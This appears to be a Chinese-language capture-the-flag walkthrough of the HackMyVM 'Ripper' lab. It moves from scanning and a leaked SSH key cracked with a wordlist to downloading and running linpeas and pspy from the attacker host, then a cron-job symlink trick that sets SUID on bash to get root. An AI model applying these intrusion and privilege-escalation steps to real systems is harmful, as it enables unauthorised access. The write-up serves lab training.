@@ -1,0 +1,277 @@
+> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/W_R4F2O89Kh_oE9v3GNS6g)
+
+ ![](http://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsGamtQXiblwiaPhT11gUfcWibGaGzbdzpL0N1UGmGdGP78y7DW7sCUOicTibjbBZHrHewj9uP2Tx3yPiaw/0?wx_fmt=png) ** 伏波路上学安全 ** 专注于渗透测试、代码审计等安全技术，分享安全知识. 70篇原创内容   公众号
+
+![图片](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUslmU0icOO8uId70SegebGqhlkQhRz1N8EZ2ocweVFGljPDvpnvYqB1icFTRyQezIfyMkpwiapobXEFA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)  
+
+靶机信息
+----
+
+下载地址:
+
+```
+https://hackmyvm.eu/machines/machine.php?vm=Ripper  
+网盘链接：https://pan.baidu.com/s/1MYO7cEOg2xou1FrC40v6qg?pwd=ja7r
+```
+
+靶场: HackMyVm.eu
+
+靶机名称: Ripper
+
+难度: 简单
+
+发布时间: 2021年6月1日
+
+提示信息:
+
+```
+无
+```
+
+目标: user.txt和root.txt
+
+  
+
+实验环境
+----
+
+```
+攻击机:VMware kali 10.0.0.3 eth0桥接互联网，eth1桥接vbox-Host-Only  
+  
+靶机:Vbox linux IP自动获取 网卡host-Only
+```
+
+  
+
+信息收集
+----
+
+### 扫描主机
+
+扫描局域网内的靶机IP地址
+
+```
+sudo nmap -sP 10.0.0.1/24
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+扫描到主机地址为10.0.0.128
+
+### 扫描端口
+
+扫描靶机开放的服务端口
+
+```
+sudo nmap -sC -sV -p- 10.0.0.117 -oN nmap.log
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+扫描到22端口和80端口开放，先来访问80端口
+
+Web渗透
+-----
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+提示网站正在维护中，先来做个目录扫描
+
+```
+gobuster dir -w ../../Dict/SecLists-2022.1/Discovery/Web-Content/directory-list-2.3-medium.txt  -u http://10.0.0.128 -x php,txt,html
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+扫描到staff_statements.txt文件，查看内容
+
+```
+curl http://10.0.0.128/staff_statements.txt
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+提示使用SSH连接文件，针对id_rsa文件继续目录扫描
+
+```
+gobuster dir -w ../../Dict/SecLists-2022.1/Discovery/Web-Content/common.txt  -u http://10.0.0.128 -x zip,txt,bak
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+扫描到id_rsa.bak文件，下载下来查看内容
+
+```
+wget http://10.0.0.128/id_rsa.bak  
+cat id_rsa.bak
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+拿到key，但是没有用户名，虚拟机启动的时候有提示
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+登录SSH验证
+
+```
+chmod 600 id_rsa.bak  
+ssh jack@10.0.0.128 -i id_rsa.bak
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+id_rsa文件密码暴破  
+
+key文件还有密码，用RSAcrack来暴破
+
+```
+RSAcrack -k id_rsa.bak -w /usr/share/wordlists/rockyou.txt
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+密码有了，继续SSH登录
+
+```
+ssh jack@10.0.0.128 -i id_rsa.bak
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+登录成功，搜集敏感信息
+
+```
+cat /etc/passwd | grep 'bash'
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+发现另一个用户helder，找不到其他信息了，上传辅助脚本检查
+
+1。攻击机在脚本目录下开启HTTP服务
+
+```
+python3 -m http.server
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+2。靶机下载linpeas.sh脚本并执行
+
+```
+cd /tmp  
+wget http://10.0.0.3:8000/linpeas.sh  
+chmod +x linpeas.sh  
+./linpeas.sh
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+opasswd文件中保存一个密码，验证是不是helder的密码
+
+```
+su - helder
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+切换成功，继续查找敏感信息
+
+```
+ls  
+cat user.txt
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+拿到user.txt，上传pspy64检查后台运行程序
+
+```
+wget http://10.0.0.3:8000/pspy64  
+chmod +x pspy64  
+./pspy64
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+发现后台有程序每分钟执行一次，整理一下
+
+```
+/bin/sh -c nc -vv -q 1 localhost 10000 > /root/.local/out   
+if [ "$(cat /root/.local/helder.txt)" = "$(cat /home/helder/passwd.txt)" ] ;  
+then chmod +s "/usr/bin/$(cat /root/.local/out)" ; fi
+```
+
+简单分析下脚本内容：
+
+```
+nc连接本地10000端口，并将接收到的内容发送到/root/.local/out文件中  
+  
+如果/root/.local/helder.txt与/home/helder/passwd.txt内容相同  
+  
+将/root/.local/out文件中的命令加上suid权限
+```
+
+首先要让/root/.local/helder.txt与/home/helder/passwd.txt内容相同，目前/home/helder/目录下没有password文件，可以创建软链接把/root/.local/helder.txt链接到passwd.txt文件上。再向本地的10000端口发送一条命令，这个命令要在/usr/bin目录下，来验证一下。
+
+1。检查bash存放目录
+
+```
+which bash
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+2。创建软链接
+
+```
+ln -s /root/.local/helder.txt /home/helder/passwd.txt
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+3。本地监听10000端口并发送bash
+
+```
+echo 'bash' | nc localhost 1000
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+4。等待1分钟10000端口有端口连接进来后检查bash是否有suid权限
+
+```
+ls -al /usr/bin/bash
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+bash添加上suid权限了，开始提权
+
+```
+bash -p  
+id
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+拿到root权限，找找flag
+
+```
+cd /root  
+ls  
+cat root.txt
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+拿到root.txt，游戏结束。
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
